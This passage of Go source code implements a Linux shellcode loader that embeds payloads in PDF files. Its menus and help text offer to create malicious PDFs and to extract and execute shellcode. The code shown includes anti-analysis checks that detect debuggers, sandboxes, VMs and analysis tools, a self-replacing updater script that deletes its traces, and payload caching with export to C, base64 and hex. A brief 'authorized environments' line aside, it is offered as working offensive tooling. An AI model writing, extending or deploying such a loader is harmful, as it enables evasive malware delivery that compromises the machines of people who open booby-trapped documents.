	// Restart with new version
	restartWithUpdate(updateFile)
}

func createUpdaterScript(updateFile string) {
	script := fmt.Sprintf(`#!/bin/bash
sleep 2
cp "%s" loader
rm "%s"
rm "$0"
chmod +x loader
./loader &
`, updateFile, updateFile)
	
	if err := ioutil.WriteFile("update.sh", []byte(script), 0755); err != nil {
		fmt.Printf("[-] Failed to create updater script: %v\n", err)
		return
	}
	os.Chmod("update.sh", 0755)
}

func restartWithUpdate(updateFile string) {
	cmd := exec.Command("bash", "update.sh")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	
	if err := cmd.Start(); err != nil {
		fmt.Printf("[-] Failed to restart: %v\n", err)
		return
	}
	
	os.Exit(0)
}

func forceUpdate() {
	fmt.Println("[+] Forcing update check...")
	
	updateInfo, err := fetchUpdateInfo()
	if err != nil {
		fmt.Printf("[-] Update failed: %v\n", err)
		return
	}
	
	if updateInfo.Version == Version {
		fmt.Println("[+] Already on latest version")
		return
	}
	
	applyUpdate(updateInfo)
}

// ==================== UTILITIES ====================

func antiAnalysisChecks() bool {
	if !config.AntiAnalysis {
		return true
	}
	
	checks := []func() bool{
		checkDebugger,
		checkSandbox,
		checkVM,
		checkAnalysisTools,
		checkRuntime,
	}
	
	for _, check := range checks {
		if !check() {
			return false
		}
	}
	
	return true
}

func checkDebugger() bool {
	// Linux debugger check via /proc
	if _, err := os.Stat("/proc/self/status"); err == nil {
		data, err := ioutil.ReadFile("/proc/self/status")
		if err == nil {
			lines := strings.Split(string(data), "\n")
			for _, line := range lines {
				if strings.HasPrefix(line, "TracerPid:") {
					fields := strings.Fields(line)
					if len(fields) >= 2 && fields[1] == "0" {
						return true
					}
				}
			}
		}
	}
	
	// Check parent process
	ppid := os.Getppid()
	if ppid == 1 {
		// Started by init/systemd, probably OK
		return true
	}
	
	// Check for common debugger process names
	debuggers := []string{"gdb", "strace", "ltrace", "radare2", "rr"}
	cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", ppid))
	parentCmd := string(cmdline)
	
	for _, debugger := range debuggers {
		if strings.Contains(parentCmd, debugger) {
			return false
		}
	}
	
	return true
}

func checkSandbox() bool {
	// Check for sandbox artifacts on Linux
	sandboxFiles := []string{
		"/opt/cuckoo",
		"/var/lib/virustotal",
		"/tmp/vbox",
		"/tmp/vmware",
		"/proc/vmware",
		"/sys/class/dmi/id/product_name",
	}
	
	for _, file := range sandboxFiles {
		if _, err := os.Stat(file); err == nil {
			// Check DMI product name for common sandboxes
			if file == "/sys/class/dmi/id/product_name" {
				if data, err := ioutil.ReadFile(file); err == nil {
					product := strings.ToLower(string(data))
					if strings.Contains(product, "virtualbox") ||
						strings.Contains(product, "vmware") ||
						strings.Contains(product, "qemu") ||
						strings.Contains(product, "xen") {
						return false
					}
				}
			}
			return false
		}
	}
	
	// Check CPU cores (sandbox often has few cores)
	if runtime.NumCPU() < 2 {
		return false
	}
	
	// Check RAM (sandbox often has limited RAM)
	if sysinfo := getSysInfo(); sysinfo != nil && sysinfo.Totalram < 2*1024*1024*1024 {
		return false
	}
	
	return true
}

func checkVM() bool {
	// Check for VM indicators
	vmFiles := []string{
		"/proc/scsi/scsi",
		"/proc/ide/hd0/model",
		"/sys/bus/virtio",
	}
	
	for _, file := range vmFiles {
		if _, err := os.Stat(file); err == nil {
			if file == "/proc/scsi/scsi" {
				if data, err := ioutil.ReadFile(file); err == nil {
					content := strings.ToLower(string(data))
					if strings.Contains(content, "vmware") ||
						strings.Contains(content, "virtual") ||
						strings.Contains(content, "qemu") {
						return false
					}
				}
			}
			if file == "/sys/bus/virtio" {
				return false // VirtIO indicates virtualization
			}
		}
	}
	
	return true
}

func checkAnalysisTools() bool {
	// Check for analysis tools in PATH
	tools := []string{"strace", "ltrace", "gdb", "radare2", "rr", "valgrind"}
	
	for _, tool := range tools {
		if _, err := exec.LookPath(tool); err == nil {
			// Tool exists in PATH
			return false
		}
	}
	
	return true
}

func checkRuntime() bool {
	// Check if running in expected environment
	hostname, _ := os.Hostname()
	if strings.Contains(strings.ToLower(hostname), "sandbox") ||
		strings.Contains(strings.ToLower(hostname), "malware") ||
		strings.Contains(strings.ToLower(hostname), "analysis") {
		return false
	}
	
	// Check username
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	if strings.Contains(strings.ToLower(user), "analysis") ||
		strings.Contains(strings.ToLower(user), "sandbox") {
		return false
	}
	
	return true
}

func getSysInfo() *syscall.Sysinfo_t {
	var sysinfo syscall.Sysinfo_t
	if err := syscall.Sysinfo(&sysinfo); err != nil {
		return nil
	}
	return &sysinfo
}

func scanPDF(pdfPath string) {
	fmt.Printf("[+] Scanning PDF: %s\n", pdfPath)
	
	data, err := ioutil.ReadFile(pdfPath)
	if err != nil {
		fmt.Printf("[-] Error: %v\n", err)
		return
	}
	
	// Check for various indicators
	indicators := map[string]string{
		"/JS":              "JavaScript",
		"/JavaScript":      "JavaScript",
		"/OpenAction":      "Auto-execution",
		"/AA":              "Additional Actions",
		"/Launch":          "File Launch",
		"/EmbeddedFile":    "Embedded File",
		"/RichMedia":       "Rich Media",
		"/SubmitForm":      "Form Submission",
		"/GoTo":            "Navigation",
		"/URI":             "URL Launch",
		"/AcroForm":        "Form",
		"/XFA":             "XML Forms",
		"/ObjStm":          "Object Stream",
	}
	
	var findings []string
	
	for pattern, description := range indicators {
		if bytes.Contains(data, []byte(pattern)) {
			findings = append(findings, description)
		}
	}
	
	// Check for shellcode markers
	if bytes.Contains(data, []byte(B64Marker)) || bytes.Contains(data, []byte(HexMarker)) {
		findings = append(findings, "Shellcode Payload")
	}
	
	// Check file structure
	if bytes.Contains(data, []byte("%PDF")) && bytes.Contains(data, []byte("%%EOF")) {
		findings = append(findings, "Valid PDF Structure")
	} else {
		findings = append(findings, "INVALID PDF STRUCTURE")
	}
	
	// Print results
	fmt.Printf("[+] File Size: %d bytes\n", len(data))
	fmt.Printf("[+] Findings (%d):\n", len(findings))
	for _, finding := range findings {
		fmt.Printf("  • %s\n", finding)
	}
}

// ==================== PAYLOAD MANAGEMENT ====================

func listPayloads() {
	fmt.Println("[+] Listing cached payloads:")
	fmt.Println("===============================")
	
	// Create cache directory if it doesn't exist
	if err := os.MkdirAll(CacheDir, 0755); err != nil {
		fmt.Printf("[-] Error creating cache dir: %v\n", err)
		return
	}
	
	// Get all JSON files in cache directory
	files, err := filepath.Glob(filepath.Join(CacheDir, "*.json"))
	if err != nil {
		fmt.Printf("[-] Error reading cache: %v\n", err)
		return
	}
	
	if len(files) == 0 {
		fmt.Println("[!] No cached payloads found")
		return
	}
	
	// Display payload information
	for i, file := range files {
		data, err := ioutil.ReadFile(file)
		if err != nil {
			fmt.Printf("[-] Error reading %s: %v\n", file, err)
			continue
		}
		
		var payload Payload
		if err := json.Unmarshal(data, &payload); err != nil {
			fmt.Printf("[-] Error parsing %s: %v\n", file, err)
			continue
		}
		
		// Get file info
		info, _ := os.Stat(file)
		shellcodeFile := strings.TrimSuffix(file, ".json") + ".bin"
		shellcodeSize := "N/A"
		if scInfo, err := os.Stat(shellcodeFile); err == nil {
			shellcodeSize = fmt.Sprintf("%d bytes", scInfo.Size())
		}
		
		// Display payload info
		fmt.Printf("\n[%d] %s\n", i+1, filepath.Base(file))
		fmt.Printf("    Type:      %s\n", payload.Type)
		fmt.Printf("    OS/Arch:   %s/%s\n", payload.OS, payload.Arch)
		fmt.Printf("    Timestamp: %s\n", time.Unix(payload.Timestamp, 0).Format("2006-01-02 15:04:05"))
		fmt.Printf("    Checksum:  %s...\n", payload.Checksum[:16])
		fmt.Printf("    Size:      %s\n", shellcodeSize)
		fmt.Printf("    Modified:  %s\n", info.ModTime().Format("2006-01-02 15:04:05"))
		
		// Calculate age
		age := time.Since(info.ModTime())
		if age.Hours() < 24 {
			fmt.Printf("    Age:       %.1f hours ago\n", age.Hours())
		} else {
			fmt.Printf("    Age:       %.1f days ago\n", age.Hours()/24)
		}
	}
	
	fmt.Println("\n===============================")
	fmt.Printf("Total payloads: %d\n", len(files))
	
	// Show cache statistics
	showCacheStats()
}

func showCacheStats() {
	var totalSize int64
	var oldest, newest time.Time
	var oldestFile, newestFile string
	
	files, _ := filepath.Glob(filepath.Join(CacheDir, "*"))
	
	for i, file := range files {
		info, err := os.Stat(file)
		if err != nil {
			continue
		}
		
		totalSize += info.Size()
		
		if i == 0 {
			oldest = info.ModTime()
			newest = info.ModTime()
			oldestFile = file
			newestFile = file
		} else {
			if info.ModTime().Before(oldest) {
				oldest = info.ModTime()
				oldestFile = file
			}
			if info.ModTime().After(newest) {
				newest = info.ModTime()
				newestFile = file
			}
		}
	}
	
	fmt.Printf("Cache size:    %s\n", formatBytes(totalSize))
	if len(files) > 0 {
		fmt.Printf("Oldest:        %s (%s)\n", 
			filepath.Base(oldestFile), 
			time.Since(oldest).Round(time.Hour))
		fmt.Printf("Newest:        %s (%s)\n", 
			filepath.Base(newestFile), 
			time.Since(newest).Round(time.Minute))
	}
}

func formatBytes(bytes int64) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%d B", bytes)
	}
	div, exp := int64(unit), 0
	for n := bytes / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %ciB", float64(bytes)/float64(div), "KMGTPE"[exp])
}

func cachePayload(payload *Payload, shellcode []byte) error {
	// Create cache directory if it doesn't exist
	if err := os.MkdirAll(CacheDir, 0755); err != nil {
		return err
	}
	
	// Generate unique filename based on checksum and timestamp
	filename := fmt.Sprintf("payload_%s_%d", payload.Checksum[:8], payload.Timestamp)
	jsonFile := filepath.Join(CacheDir, filename+".json")
	binFile := filepath.Join(CacheDir, filename+".bin")
	
	// Save payload metadata
	payloadJSON, err := json.MarshalIndent(payload, "", "  ")
	if err != nil {
		return err
	}
	
	if err := ioutil.WriteFile(jsonFile, payloadJSON, 0644); err != nil {
		return err
	}
	
	// Save shellcode
	if err := ioutil.WriteFile(binFile, shellcode, 0644); err != nil {
		// Clean up JSON file if shellcode save fails
		os.Remove(jsonFile)
		return err
	}
	
	fmt.Printf("[+] Payload cached: %s\n", filename)
	return nil
}

func loadCachedPayload(checksum string) (*Payload, []byte, error) {
	files, err := filepath.Glob(filepath.Join(CacheDir, "*.json"))
	if err != nil {
		return nil, nil, err
	}
	
	for _, file := range files {
		data, err := ioutil.ReadFile(file)
		if err != nil {
			continue
		}
		
		var payload Payload
		if err := json.Unmarshal(data, &payload); err != nil {
			continue
		}
		
		if payload.Checksum == checksum {
			// Load corresponding shellcode
			binFile := strings.TrimSuffix(file, ".json") + ".bin"
			shellcode, err := ioutil.ReadFile(binFile)
			if err != nil {
				return nil, nil, err
			}
			return &payload, shellcode, nil
		}
	}
	
	return nil, nil, fmt.Errorf("payload not found in cache")
}

func deleteCachedPayload(checksum string) error {
	files, err := filepath.Glob(filepath.Join(CacheDir, "*.json"))
	if err != nil {
		return err
	}
	
	for _, file := range files {
		data, err := ioutil.ReadFile(file)
		if err != nil {
			continue
		}
		
		var payload Payload
		if err := json.Unmarshal(data, &payload); err != nil {
			continue
		}
		
		if payload.Checksum == checksum {
			// Delete both JSON and binary files
			binFile := strings.TrimSuffix(file, ".json") + ".bin"
			
			if err := os.Remove(file); err != nil {
				return err
			}
			if err := os.Remove(binFile); err != nil && !os.IsNotExist(err) {
				return err
			}
			
			fmt.Printf("[+] Deleted cached payload: %s\n", payload.Checksum[:8])
			return nil
		}
	}
	
	return fmt.Errorf("payload not found")
}

func cleanOldPayloads(maxAgeDays int) error {
	files, err := filepath.Glob(filepath.Join(CacheDir, "*"))
	if err != nil {
		return err
	}
	
	cutoff := time.Now().AddDate(0, 0, -maxAgeDays)
	var deleted int
	
	for _, file := range files {
		info, err := os.Stat(file)
		if err != nil {
			continue
		}
		
		if info.ModTime().Before(cutoff) {
			if err := os.Remove(file); err == nil {
				deleted++
			}
		}
	}
	
	if deleted > 0 {
		fmt.Printf("[+] Cleaned %d old payloads\n", deleted)
	}
	
	return nil
}

func interactivePayloadManagement() {
	scanner := bufio.NewScanner(os.Stdin)
	
	for {
		fmt.Println("\n[+] Payload Management Menu:")
		fmt.Println("  1. List all payloads")
		fmt.Println("  2. View payload details")
		fmt.Println("  3. Delete payload")
		fmt.Println("  4. Export payload")
		fmt.Println("  5. Clean old payloads (30+ days)")
		fmt.Println("  6. Clear all cached payloads")
		fmt.Println("  7. Back to main menu")
		fmt.Print("\nSelect option: ")
		
		scanner.Scan()
		choice := scanner.Text()
		
		switch choice {
		case "1":
			listPayloads()
		case "2":
			viewPayloadDetails(scanner)
		case "3":
			deletePayloadInteractive(scanner)
		case "4":
			exportPayload(scanner)
		case "5":
			cleanOldPayloads(30)
		case "6":
			clearAllPayloads(scanner)
		case "7":
			return
		default:
			fmt.Println("[-] Invalid choice")
		}
	}
}

func viewPayloadDetails(scanner *bufio.Scanner) {
	fmt.Print("Enter payload checksum (or partial): ")
	scanner.Scan()
	search := scanner.Text()
	
	files, err := filepath.Glob(filepath.Join(CacheDir, "*.json"))
	if err != nil {
		fmt.Printf("[-] Error: %v\n", err)
		return
	}
	
	var matches []string
	for _, file := range files {
		data, _ := ioutil.ReadFile(file)
		var payload Payload
		if json.Unmarshal(data, &payload) == nil {
			if strings.Contains(payload.Checksum, search) || strings.Contains(file, search) {
				matches = append(matches, file)
			}
		}
	}
	
	if len(matches) == 0 {
		fmt.Println("[-] No matching payloads found")
		return
	}
	
	if len(matches) == 1 {
		displayFullPayloadDetails(matches[0])
	} else {
		fmt.Println("\n[+] Multiple matches found:")
		for i, file := range matches {
			data, _ := ioutil.ReadFile(file)
			var payload Payload
			json.Unmarshal(data, &payload)
			fmt.Printf("  %d. %s (%s/%s)\n", 
				i+1, payload.Checksum[:12], payload.OS, payload.Arch)
		}
		fmt.Print("\nSelect payload number: ")
		scanner.Scan()
		idx, _ := strconv.Atoi(scanner.Text())
		if idx > 0 && idx <= len(matches) {
			displayFullPayloadDetails(matches[idx-1])
		}
	}
}

func displayFullPayloadDetails(file string) {
	data, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Printf("[-] Error: %v\n", err)
		return
	}
	
	var payload Payload
	if err := json.Unmarshal(data, &payload); err != nil {
		fmt.Printf("[-] Error: %v\n", err)
		return
	}
	
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("PAYLOAD DETAILS")
	fmt.Println(strings.Repeat("=", 60))
	
	// Display metadata
	fmt.Printf("Type:        %s\n", payload.Type)
	fmt.Printf("OS/Arch:     %s/%s\n", payload.OS, payload.Arch)
	fmt.Printf("Timestamp:   %s\n", time.Unix(payload.Timestamp, 0).Format("2006-01-02 15:04:05 MST"))
	fmt.Printf("Checksum:    %s\n", payload.Checksum)
	
	// Try to load shellcode for analysis
	binFile := strings.TrimSuffix(file, ".json") + ".bin"
	if shellcode, err := ioutil.ReadFile(binFile); err == nil {
		fmt.Printf("Size:        %d bytes\n", len(shellcode))
		
		// Analyze shellcode
		fmt.Println("\nShellcode Analysis:")
		firstBytes := 16
		if len(shellcode) < firstBytes {
			firstBytes = len(shellcode)
		}
		fmt.Printf("  First %d bytes: %s\n", firstBytes, hex.EncodeToString(shellcode[:firstBytes]))
		
		lastBytes := 16
		if len(shellcode) < lastBytes {
			lastBytes = len(shellcode)
		}
		if len(shellcode) > lastBytes {
			fmt.Printf("  Last %d bytes:  %s\n", lastBytes, hex.EncodeToString(shellcode[len(shellcode)-lastBytes:]))
		}
		
		// Detect potential shellcode type
		detectShellcodeType(shellcode)
		
		// Show entropy
		entropy := calculateEntropy(shellcode)
		fmt.Printf("  Entropy:        %.2f bits/byte\n", entropy)
		
		if entropy > 7.5 {
			fmt.Println("  [*] High entropy - likely encrypted/compressed")
		}
	}
	
	fmt.Println(strings.Repeat("=", 60))
}

func detectShellcodeType(shellcode []byte) {
	if len(shellcode) < 4 {
		return
	}
	
	// Common shellcode signatures for Linux
	signatures := []struct {
		name string
		sig  []byte
	}{
		{"Linux x64 (common)", []byte{0x48, 0x31}},
		{"Linux x86", []byte{0x31, 0xC0}},
		{"Reverse TCP", []byte{0x6A, 0x00, 0x68}},
		{"Bind Shell", []byte{0x31, 0xC0, 0x50}},
		{"Execve", []byte{0x31, 0xC0, 0x50, 0x68}},
	}
	
	for _, sig := range signatures {
		if bytes.HasPrefix(shellcode, sig.sig) {
			fmt.Printf("  Detected:      %s\n", sig.name)
			return
		}
	}
	
	// Check for ELF header (if shellcode includes an ELF)
	if bytes.HasPrefix(shellcode, []byte{0x7F, 'E', 'L', 'F'}) {
		fmt.Println("  Detected:      ELF executable")
	}
}

func calculateEntropy(data []byte) float64 {
	if len(data) == 0 {
		return 0
	}
	
	freq := make(map[byte]float64)
	for _, b := range data {
		freq[b]++
	}
	
	var entropy float64
	for _, count := range freq {
		p := count / float64(len(data))
		entropy -= p * math.Log2(p)
	}
	
	return entropy
}

func deletePayloadInteractive(scanner *bufio.Scanner) {
	fmt.Print("Enter checksum to delete (or 'all' for all): ")
	scanner.Scan()
	target := scanner.Text()
	
	if strings.ToLower(target) == "all" {
		fmt.Print("Are you sure? (yes/no): ")
		scanner.Scan()
		if strings.ToLower(scanner.Text()) == "yes" {
			files, _ := filepath.Glob(filepath.Join(CacheDir, "*"))
			deleted := 0
			for _, file := range files {
				if err := os.Remove(file); err == nil {
					deleted++
				}
			}
			fmt.Printf("[+] Deleted %d files\n", deleted)
		}
		return
	}
	
	if err := deleteCachedPayload(target); err != nil {
		fmt.Printf("[-] Error: %v\n", err)
	}
}

func exportPayload(scanner *bufio.Scanner) {
	fmt.Print("Enter checksum to export: ")
	scanner.Scan()
	checksum := scanner.Text()
	
	payload, shellcode, err := loadCachedPayload(checksum)
	if err != nil {
		fmt.Printf("[-] Error: %v\n", err)
		return
	}
	
	fmt.Print("Export format (raw/json/c/b64/hex): ")
	scanner.Scan()
	format := strings.ToLower(scanner.Text())
	
	fmt.Print("Output filename: ")
	scanner.Scan()
	filename := scanner.Text()
	
	var exportErr error
	switch format {
	case "raw":
		exportErr = ioutil.WriteFile(filename, shellcode, 0644)
	case "json":
		data, _ := json.MarshalIndent(payload, "", "  ")
		exportErr = ioutil.WriteFile(filename, data, 0644)
	case "c":
		exportErr = exportAsC(shellcode, filename)
	case "b64":
		b64 := base64.StdEncoding.EncodeToString(shellcode)
		exportErr = ioutil.WriteFile(filename, []byte(b64), 0644)
	case "hex":
		hexStr := hex.EncodeToString(shellcode)
		exportErr = ioutil.WriteFile(filename, []byte(hexStr), 0644)
	default:
		fmt.Println("[-] Invalid format")
		return
	}
	
	if exportErr != nil {
		fmt.Printf("[-] Export failed: %v\n", exportErr)
	} else {
		fmt.Printf("[+] Exported to %s\n", filename)
	}
}

func exportAsC(shellcode []byte, filename string) error {
	var buf bytes.Buffer
	buf.WriteString("unsigned char shellcode[] = {\n    ")
	
	for i, b := range shellcode {
		buf.WriteString(fmt.Sprintf("0x%02x", b))
		if i < len(shellcode)-1 {
			buf.WriteString(", ")
			if (i+1) % 12 == 0 {
				buf.WriteString("\n    ")
			}
		}
	}
	
	buf.WriteString("\n};\n")
	buf.WriteString(fmt.Sprintf("unsigned int shellcode_len = %d;\n", len(shellcode)))
	
	return ioutil.WriteFile(filename, buf.Bytes(), 0644)
}

func clearAllPayloads(scanner *bufio.Scanner) {
	fmt.Print("WARNING: This will delete ALL cached payloads. Continue? (yes/no): ")
	scanner.Scan()
	if strings.ToLower(scanner.Text()) != "yes" {
		fmt.Println("[-] Operation cancelled")
		return
	}
	
	files, err := filepath.Glob(filepath.Join(CacheDir, "*"))
	if err != nil {
		fmt.Printf("[-] Error: %v\n", err)
		return
	}
	
	deleted := 0
	for _, file := range files {
		if err := os.Remove(file); err == nil {
			deleted++
		}
	}
	
	fmt.Printf("[+] Deleted %d cached payloads\n", deleted)
}

func runInteractiveMode() {
	scanner := bufio.NewScanner(os.Stdin)
	
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("  SHELLCODE LOADER INTERACTIVE MODE v" + Version + " (Linux)")
	fmt.Println(strings.Repeat("=", 60))
	
	for {
		fmt.Println("\n[+] Main Menu:")
		fmt.Println("  1. Extract & Execute from PDF")
		fmt.Println("  2. Create Malicious PDF")
		fmt.Println("  3. Payload Management")
		fmt.Println("  4. Scan PDF")
		fmt.Println("  5. Obfuscate Shellcode")
		fmt.Println("  6. Check for Updates")
		fmt.Println("  7. System Info")
		fmt.Println("  8. Clean Cache")
		fmt.Println("  9. Exit")
		fmt.Print("\nSelect option: ")
		
		scanner.Scan()
		choice := scanner.Text()
		
		switch choice {
		case "1":
			fmt.Print("Enter PDF path: ")
			scanner.Scan()
			extractAndExecute(scanner.Text())
		case "2":
			fmt.Print("Shellcode file: ")
			scanner.Scan()
			scFile := scanner.Text()
			fmt.Print("Output PDF: ")
			scanner.Scan()
			outPDF := scanner.Text()
			fmt.Print("Template PDF (optional): ")
			scanner.Scan()
			tmplPDF := scanner.Text()
			createMaliciousPDF(scFile, outPDF, tmplPDF)
		case "3":
			interactivePayloadManagement()
		case "4":
			fmt.Print("PDF to scan: ")
			scanner.Scan()
			scanPDF(scanner.Text())
		case "5":
			fmt.Print("Input file: ")
			scanner.Scan()
			inFile := scanner.Text()
			fmt.Print("Output file: ")
			scanner.Scan()
			outFile := scanner.Text()
			obfuscateShellcodeFile(inFile, outFile)
		case "6":
			forceUpdate()
		case "7":
			showSystemInfo()
		case "8":
			cleanCache()
		case "9":
			fmt.Println("[+] Exiting...")
			return
		default:
			fmt.Println("[-] Invalid choice")
		}
	}
}

func showSystemInfo() {
	fmt.Println("\n[+] System Information:")
	fmt.Printf("  OS:              %s\n", runtime.GOOS)
	fmt.Printf("  Architecture:    %s\n", runtime.GOARCH)
	fmt.Printf("  CPUs:            %d\n", runtime.NumCPU())
	fmt.Printf("  Go Version:      %s\n", runtime.Version())
	
	// Memory info
	var mem runtime.MemStats
	runtime.ReadMemStats(&mem)
	fmt.Printf("  Memory Used:     %s\n", formatBytes(int64(mem.Alloc)))
	fmt.Printf("  Total Memory:    %s\n", formatBytes(int64(mem.Sys)))
	
	// System info
	if sysinfo := getSysInfo(); sysinfo != nil {
		fmt.Printf("  Uptime:          %d days, %d hours\n", 
			sysinfo.Uptime/86400, (sysinfo.Uptime%86400)/3600)
		fmt.Printf("  Total RAM:       %s\n", formatBytes(int64(sysinfo.Totalram)))
		fmt.Printf("  Free RAM:        %s\n", formatBytes(int64(sysinfo.Freeram)))
	}
	
	// Cache info
	if info, err := os.Stat(CacheDir); err == nil {
		fmt.Printf("  Cache Location: %s\n", CacheDir)
		fmt.Printf("  Cache Modified: %s\n", info.ModTime().Format("2006-01-02 15:04:05"))
	}
	
	// Config info
	fmt.Printf("  Auto Update:     %v\n", config.AutoUpdate)
	fmt.Printf("  Obfuscation:     %v\n", config.UseObfuscation)
	fmt.Printf("  Anti-Analysis:   %v\n", config.AntiAnalysis)
}

func cleanCache() {
	if err := os.RemoveAll(CacheDir); err != nil {
		fmt.Printf("[-] Error cleaning cache: %v\n", err)
		return
	}
	fmt.Println("[+] Cache cleaned successfully")
}

// ==================== HELPER FUNCTIONS ====================

func padKey(key string) string {
	if len(key) >= 32 {
		return key[:32]
	}
	padded := key
	for len(padded) < 32 {
		padded += key
	}
	return padded[:32]
}

func calculateChecksum(data []byte) string {
	hash := sha256.Sum256(data)
	return hex.EncodeToString(hash[:])
}

func verifyChecksum(data []byte, expected string) bool {
	return calculateChecksum(data) == expected
}

func isValidShellcode(data []byte) bool {
	if len(data) < 4 {
		return false
	}
	
	// Check for common shellcode patterns
	commonPrefixes := [][]byte{
		{0x48, 0x31}, {0x31, 0xC0}, {0x55, 0x48}, {0xe8, 0x00},
		{0x6a, 0x00}, {0x68, 0x00}, {0xb8, 0x00},
	}
	
	for _, prefix := range commonPrefixes {
		if bytes.HasPrefix(data, prefix) {
			return true
		}
	}
	
	return false
}

func checkCompatibility(payload *Payload) bool {
	// Simple compatibility check
	if payload.OS != "" && payload.OS != runtime.GOOS {
		return false
	}
	if payload.Arch != "" && payload.Arch != runtime.GOARCH {
		return false
	}
	return true
}

func printHelp() {
	fmt.Println(`Shellcode Loader v` + Version + ` (Linux)
Advanced PDF-based shellcode loader with self-updating capabilities

COMMANDS:
  extract <pdf>          Extract and execute shellcode from PDF
  create <sc> <out> [tmpl] Create malicious PDF with shellcode
  obfuscate <in> <out>   Obfuscate shellcode file
  deobfuscate <in> <out> Deobfuscate shellcode file
  update                 Force update check and apply
  scan <pdf>             Scan PDF for malicious content
  list                   List cached payloads
  manage                 Interactive payload management
  clean                  Clean cache directory
  version                Show version
  interactive            Launch interactive mode

EXAMPLES:
  ./loader extract malicious.pdf
  ./loader create shellcode.bin output.pdf template.pdf
  ./loader scan suspicious.pdf
  ./loader update
  ./loader manage

PAYLOAD MANAGEMENT:
  - View detailed payload information
  - Delete specific or all payloads
  - Export in multiple formats (raw, JSON, C, base64, hex)
  - Automatic cleanup of old payloads

CONFIGURATION:
  Edit ` + ConfigFile + ` to customize behavior
  Enable/disable anti-analysis, obfuscation, auto-update

SECURITY:
  Use only in authorized environments
  Keep configuration secure
  Monitor network traffic`)
}

// Unsafe pointer conversion helper
func unsafePtr(b []byte) uintptr {
	return uintptr(unsafe.Pointer(&b[0]))
}
